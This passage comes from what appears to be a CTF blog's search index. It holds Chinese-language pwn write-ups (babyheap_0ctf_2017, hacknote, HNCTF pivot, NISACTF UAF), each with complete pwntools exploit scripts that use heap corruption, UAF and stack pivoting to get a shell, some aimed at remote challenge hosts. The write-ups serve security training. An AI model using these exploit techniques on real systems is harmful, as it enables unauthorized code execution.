    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044c156) # pop rdx ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
    p += p64(0x3b)
    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040139c) # syscall
    return p

tmp=rop()

payload=&#39;a&#39;*0x50

tt=&#39;&#39;

for i in tmp:
    tt+=chr(i^0x66)
payload+=tt
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2019华南]PWN8 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/4WTMScs9z/"" data-c="
          &lt;p&gt;本题64位保护全开，考察fastbin attack和unsorted bin leak、chunk extend等等，注意需要patchelf&lt;br&gt;
主函数中menu可以大概概括此题所用到函数&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679552396568.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
1.allocate：&lt;br&gt;
按idx顺序分配堆块，其中可以自己指定size，最大4096，并且分配时使用的时calloc()函数，分配后会给content赋0&lt;br&gt;
2.fill:&lt;br&gt;
自己指定size和content，此处可以造成堆溢出&lt;br&gt;
3.free&lt;br&gt;
释放指定idx的堆块的内容，指针置零，故不存在uaf&lt;br&gt;
4.dump&lt;br&gt;
打印出指定idx的堆块的content&lt;br&gt;
故可以考虑泄露bin[0]后根据偏移计算出libc基址利用one_gadget求解此题；&lt;br&gt;
堆上泄露使用的是unsorted bin leak，unsorted bin使用双向链表进行管理，使用fd和bk指针，说明见ctf-wiki&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679553089112.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679553188030.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
首先我们可以分配4个fast chunk(idx=0、1、2、3)，1个small chunk(idx=4)&lt;br&gt;
先free掉chunk 1和chunk 2&lt;br&gt;
此时&lt;code&gt;main_arena-&amp;gt;chunk 2-&amp;gt;chunk 1&amp;lt;-0x0&lt;/code&gt;&lt;br&gt;
后通过堆溢出将chunk 2的fd指针覆盖为chunk 4的地址，以便后续dump出leak_addr&lt;br&gt;
通过堆溢出将chunk 4的size修改符合fast bin的大小&lt;br&gt;
接着通过两次alloc(0x10)将chunk 2和chunk 4重新分配回去，此时chunk 2和chunk 4指向内存中同一块区域&lt;br&gt;
然后我们再次通过堆溢出将chunk 4的堆块大小改回去，改为small chunk大小&lt;br&gt;
接着我们再申请一块small chunk，防止free(4)后chunk 4和top chunk合并&lt;br&gt;
然后free(4)后chunk 4被划到unsorted bin中，fd和bk指向main_arena的一块偏移地址处(不是main_arena地址)&lt;br&gt;
此时可以dump出这块偏移地址&lt;br&gt;
可以算出该地址距离main_arena偏移为0x58&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679557961646.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
然后根据malloc_trim中main_arena的偏移算出libc的基址&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679559052671.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
获取libc基址后我们可以劫持__malloc_hook&lt;br&gt;
原理是在调用malloc或者free的时候，如果 malloc_hook 和free_hook的值存在，则会调用malloc_hook或者free_hook指向的地址，假设在使用one_gadget的时候满足one_gadget的调用条件，当overwrite malloc_hook和free_hook的时候，便可以getshell，执行malloc的时候，其参数是size大小，所以overwrite malloc_hook的时候使用one_gadget的地址可以getshell。执行free的时候，可以将__free_hook的值overwrite为system的地址，通过释放(/bin/sh\x00)的chunk，可以达到system(/bin/sh)来getshell&lt;br&gt;
所以我们需要一块malloc_hook附近的fake_chunk，使其进入fast bin，再将其申请出来，通过fill()可以将malloc_hook修改为one_gadget&lt;br&gt;
最后从chunk 4（unsorted bin中）申请一块fast chunk出来，free掉进入fast bin，然后通过修改chunk 2可以修改chunk 4的fd到fake_chunk，最后分配fake_chunk，fill(6) 即chunk 6来getshell&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



io=process(&amp;quot;./babyheap_0ctf_2017&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26939)
elf=ELF(&amp;quot;./babyheap_0ctf_2017&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
main_arena_off=0x3C4B20
fake_chunk_off=0x3c4aed

def alloc(n):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;1&amp;quot;)
    io.recvuntil(b&amp;quot;Size: &amp;quot;)
    io.sendline(str(n))

def fill(n,s,m):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recvuntil(b&amp;quot;Index: &amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;Size: &amp;quot;)
    io.sendline(str(s))
    io.recvuntil(b&amp;quot;Content: &amp;quot;)
    io.send(m)

def free(n):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;3&amp;quot;)
    io.recvuntil(b&amp;quot;Index: &amp;quot;)
    io.sendline(str(n))

def dump(n):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;4&amp;quot;)
    io.recvuntil(b&amp;quot;Index: &amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;Content: \n&amp;quot;)


alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)

free(1)
free(2)

payload=b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x21)+b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x21)+p8(0x80)
fill(0,len(payload),payload)


payload=b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x21)
fill(3,len(payload),payload)


alloc(0x10)  #allocate chunk2
alloc(0x10) #allocate chunk4

payload=b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x91)
fill(3,len(payload),payload)

alloc(0x80)
free(4)

gdb.attach(io)
pause()

dump(2)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))
libc_addr=leak_addr-main_arena_off-0x58
fake_chunk=libc_addr+fake_chunk_off
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
shell=one_gadget[1]+libc_addr
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
print(&amp;quot;fake_chunk:  &amp;quot;+hex(fake_chunk))
print(&amp;quot;malloc_hook:  &amp;quot;+hex(malloc_hook))
print(&amp;quot;shell:  &amp;quot;+hex(shell))





alloc(0x60) #fast chunk
free(4) #into fast bin
payload=p64(fake_chunk)
fill(2,len(payload),payload)


alloc(0x60) #chunk 4
alloc(0x60) #chunk 6
payload=cyclic(0x13)+p64(shell)
fill(6,len(payload),payload)
alloc(0x100)

io.interactive()


# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">babyheap_0ctf_2017 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xKSRkZlGH/"" data-c="
          &lt;p&gt;一道32位堆题，开启nx保护，free后指针未置null存在uaf漏洞&lt;br&gt;
ida主函数&lt;img src=&#34;https://oraclepi.tech/post-images/1679384000551.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
menu中可以看出存在add_note，del_note，printf_note三个主要函数&lt;br&gt;
进入到add_note里面可以发现每次add时给二维指针数组notelist分配了8bytes空间&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679384185720.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
print_note可以执行*(notelist[v2])(notelist[v2])处的函数&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679384273443.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
而造成漏洞的del_note函数中free&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679384215187.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
而notelist的前四个字节维护首地址，后四个字节维护内容&lt;br&gt;
于是我们先add_note两次，再依次del_note之后，最后一次add_note时将size设为8保证best fit原则分配到最初free的chunk中，最后print_note获取shell&lt;br&gt;
gdb调试发现最后call eax时执行0x9f451a0处填充的地址指向的函数&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679386515982.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./hacknote&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25546)
back_door=0x8048945

def add(n,st):
    io.recvuntil(b&amp;quot;choice :&amp;quot;)
    io.sendline(b&amp;quot;1&amp;quot;)
    io.recvuntil(b&amp;quot;size :&amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;Content :&amp;quot;)
    io.send(st)

def delete(n):
    io.recvuntil(b&amp;quot;choice :&amp;quot;)
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recvuntil(b&amp;quot;Index :&amp;quot;)
    io.sendline(str(n))

def printw(n):
    io.recvuntil(b&amp;quot;choice :&amp;quot;)
    io.sendline(b&amp;quot;3&amp;quot;)
    io.recvuntil(b&amp;quot;Index :&amp;quot;)
    io.sendline(str(n))

add(24,cyclic(0x18))
add(24,cyclic(0x18))
delete(0)
delete(1)
gdb.attach(io)
pause()
add(8,p32(back_door))
printw(0)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">hitcontraining_uaf wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/M53rCmTPP/"" data-c="
          &lt;p&gt;64位开启nx保护的栈迁移题目&lt;br&gt;
ida主函数，可以看出只有一次溢出&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679066891201.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
第一次迁移栈到bss段上，调用read进行布栈操作，泄露libc基址，注意输入距离rbp为0x60，每次迁移都需要考虑偏移&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0x60)+p64(leave_ret)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第二次迁移构造获取shell，也可以不迁移直接打one_gadget&lt;br&gt;
迁移注意偏移量，这里&lt;code&gt;-0xa8&lt;/code&gt;我是gdb手调出来的，🥹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0xa8)+p64(leave_ret)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;完整exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./pwn1&amp;quot;)
# io=remote(&amp;quot;1.13.251.106&amp;quot;,8005)
elf=ELF(&amp;quot;./pwn1&amp;quot;)
libc=ELF(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
bss_addr=0x404040+0x700
pop_rdi_ret=0x401283
leave_ret=0x401214
read_text=0x4011FD
main=0x4011db

gdb.attach(io)
pause()

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=cyclic(0x60)+p64(bss_addr)+p64(read_text)
io.send(payload)

payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0x60)+p64(leave_ret)

io.send(payload)
base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))

sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0xa8)+p64(leave_ret)
io.sendline(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000401214 : leave ; ret
# 0x000000000040127c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401280 : pop r14 ; pop r15 ; ret
# 0x0000000000401282 : pop r15 ; ret
# 0x000000000040127b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x0000000000401283 : pop rdi ; ret
# 0x0000000000401281 : pop rsi ; pop r15 ; ret
# 0x000000000040127d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">只有一次溢出的栈迁移练习</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/oDp60mSoN/"" data-c="
          &lt;p&gt;又一道栈迁移，64位开启canary和nx保护，&lt;br&gt;
ida查看共有两次输入，都需要验证canary&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678940554319.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678940558887.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
而第二次溢出长度不够，考虑栈迁移&lt;br&gt;
于是第一次溢出泄露canary，第二次进行栈迁移，再到迁移到的bss段上进行布栈操作泄露libc，最后再&lt;s&gt;返回主函数使用one_gadget&lt;/s&gt;&lt;br&gt;
泄露canary之后的第一段payload：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=cyclic(0x108)+p64(canary)+p64(bss_addr)+p64(read_text) #read_text为第二次read 
io.send(payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;利用一次leave控制rbp寄存器到bss_addr处，再进行read，从距离rbp-0x110处开始布栈，注意将rbp(也就是bss_addr处）覆盖为bss_addr-0x110，将rbp+0x8（也就是bss_addr+0x8)处覆盖为leave_ret，完成后第二次leave劫持rsp到bss_addr+0x8处，同时将rbp指向bss_addr-0x110处，然后第三次leave_ret先劫持rsp到bss_addr-0x110处，然后pop rbp导致rsp+0x8，最后ret执行后续指令，于是利用第二段payload泄露libc，注意栈空间计算，这里使用了ljust左对齐，之前手算的偏移导致canary验证出错😶‍🌫️&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x110)+p64(leave_ret)
io.sendline(payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另外注意最后返回的是vuln函数不是main函数，一开始返回main用gdb步进到printf出问题，（main函数中setbuf后缓冲区设0，导致printf时会有一个在栈上创建一坨相关数据结构的操作，就算正常跑也要吃掉大量栈，所以会跑着跑着栈不够了，写到不该写的地方了。）--学长原话摘抄&lt;br&gt;
最后此题one_gadget只有一个能在本地调试模式下打通，远端通不了；&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678942093537.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
还是放下不完整的exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pivot&amp;quot;)
# io=remote(&amp;quot;43.143.7.127&amp;quot;,28559)
elf=ELF(&amp;quot;./pivot&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
one_gadget=[0x50a37,0xebcf1,0xebcf5,0xebcf8,0xebd52,0xebdaf,0xebdb3]
pop_rdi_ret=0x401343
bss_addr=0x404080+0x500
leave_ret=0x401213
read_text=0x4011D4
vuln=0x4011b6

io.recvuntil(b&amp;quot;Name:\n&amp;quot;)
payload=b&amp;quot;a&amp;quot;*0x28

gdb.attach(io)
pause()

io.sendline(payload)
io.recvuntil(b&amp;quot;a\n&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary:  &amp;quot;+hex(canary))

payload=cyclic(0x108)+p64(canary)+p64(bss_addr)+p64(read_text)
io.send(payload)

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x110)+p64(leave_ret)
io.sendline(payload)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))

# sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
# str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

shell=one_gadget[0]+base_addr
print(&amp;quot;shell:  &amp;quot;+hex(shell))
payload=cyclic(0x107)+p64(canary)+p64(0)+p64(shell)
io.send(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000401213 : leave ; ret
# 0x0000000000401196 : mov byte ptr [rip + 0x2eeb], 1 ; pop rbp ; ret
# 0x00000000004012d3 : mov ecx, 0xc9fffffd ; ret
# 0x000000000040133c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401340 : pop r14 ; pop r15 ; ret
# 0x0000000000401342 : pop r15 ; ret
# 0x000000000040133b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401343 : pop rdi ; ret
# 0x0000000000401341 : pop rsi ; pop r15 ; ret
# 0x000000000040133d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++&lt;br&gt;
更新:&lt;br&gt;
本题不用one_gadget就在最后一次溢出处再迁移一次栈利用构造也行,注意gdb调试偏移量,&lt;s&gt;我不会算只有一次次试&lt;/s&gt;&lt;br&gt;
更新后exp可通远端:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pivot&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28442)
elf=ELF(&amp;quot;./pivot&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
one_gadget=[0x50a37,0xebcf1,0xebcf5,0xebcf8,0xebd52,0xebdaf,0xebdb3]
pop_rdi_ret=0x401343
bss_addr=0x404080+0x900 #偏移卡了我3天,x学长指点通了
leave_ret=0x401213
read_text=0x4011D4
vuln=0x4011b6

io.recvuntil(b&amp;quot;Name:\n&amp;quot;)
payload=b&amp;quot;a&amp;quot;*0x28

# gdb.attach(io)
# pause()

io.sendline(payload)
io.recvuntil(b&amp;quot;a\n&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary:  &amp;quot;+hex(canary))

payload=cyclic(0x108)+p64(canary)+p64(bss_addr)+p64(read_text)
io.send(payload)

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x110)+p64(leave_ret)
io.send(payload)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))

sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

shell=one_gadget[1]+base_addr
print(&amp;quot;sys_addr:  &amp;quot;+hex(sys_addr))
print(&amp;quot;str_bin_sh:  &amp;quot;+hex(str_bin_sh))

payload=p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x208)+p64(leave_ret)  #0x208偏移从0x220开始手调😎👓🥹
io.sendline(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000401213 : leave ; ret
# 0x0000000000401196 : mov byte ptr [rip + 0x2eeb], 1 ; pop rbp ; ret
# 0x00000000004012d3 : mov ecx, 0xc9fffffd ; ret
# 0x000000000040133c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401340 : pop r14 ; pop r15 ; ret
# 0x0000000000401342 : pop r15 ; ret
# 0x000000000040133b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401343 : pop rdi ; ret
# 0x0000000000401341 : pop rsi ; pop r15 ; ret
# 0x000000000040133d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK2]pivot wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/RpGkEvpwv/"" data-c="
          &lt;p&gt;这道题考察UAF和系统调用，最后拿shell耗费时间比构造UAF时间长；&lt;br&gt;
存在system()函数，但需要自己传参&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678522527943.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
本题存在4个函数，其中create函数每次开辟一个下标递增的page，edit函数可以修改指定page，del函数删除指定page，但free后没有将指针置NULL，存在UAF；&lt;br&gt;
而show函数则是本题关键&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678522658853.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
当输入为非0时，展示输入指向的page，而当输入为0时，则执行page0处指令&lt;br&gt;
所以我们可以先create 1次生成page0，del后再create 1次生成page1，但此时page1使用的仍然时page0的堆空间，所以edit page1时等效于edit page0，最后show(0)即可；&lt;br&gt;
不过最后拿shell的路程还真是绕，此题存在&lt;code&gt;NICO&lt;/code&gt;函数可以调用&lt;code&gt;system(command)&lt;/code&gt;，&lt;br&gt;
gdb调试发现最后调用system是通过call eax调用的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;0x8048984 &amp;lt;show+60&amp;gt;    mov    eax, dword ptr [page]         &amp;lt;0x804a060&amp;gt;
0x8048989 &amp;lt;show+65&amp;gt;    mov    eax, dword ptr [eax + 4]
0x804898c &amp;lt;show+68&amp;gt;    mov    edx, dword ptr [page]         &amp;lt;0x804a060&amp;gt;
0x8048992 &amp;lt;show+74&amp;gt;    sub    esp, 0xc
0x8048995 &amp;lt;show+77&amp;gt;    push   edx
0x8048996 &amp;lt;show+78&amp;gt;    call   eax
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是eax的值最后指向[page+0x4]处，意味着最后payload构造需要在system_addr前加上0x4的偏移&lt;br&gt;
如下图，这是不加偏移的结果：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678523497501.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
可以构造初步的payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;payload=cyclic(0x4)+p32(NICO_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;加上偏移后还需考虑系统调用传参的问题，本题不能直接加上偏移就完事了，否则又会如下图：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678523557372.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
可以看出0x4的偏移作为command传进system，所以需要修改payload为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;payload=b&amp;quot;sh\x00\x00&amp;quot;+p32(NICO_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以最后exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./[NISACTF 2022]UAF&amp;quot;)
# io=remote(&amp;quot;1.14.71.254&amp;quot;,28767)
NICO_addr=0x8048642

def create():
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;1&amp;quot;)

def edit(num):
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recvuntil(b&amp;quot;page\n&amp;quot;)
    io.sendline(str(num))
    io.recvuntil(b&amp;quot;strings\n&amp;quot;)

def dele(num):
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;3&amp;quot;)
    io.recvuntil(b&amp;quot;page\n&amp;quot;)
    io.sendline(str(num))

def show(num):
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;4&amp;quot;)
    io.recvuntil(b&amp;quot;page\n&amp;quot;)
    io.sendline(str(num))

create()
dele(0)
create()
edit(1)

gdb.attach(io)
pause()

payload=b&amp;quot;sh\x00\x00&amp;quot;+p32(NICO_addr)
io.sendline(payload)
show(0)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[NISACTF 2022]UAF wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/10qStEKI_/"" data-c="
          &lt;p&gt;此题考察虚函数内存分配以及uaf(use after free)&lt;br&gt;
本题给出.cpp文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;
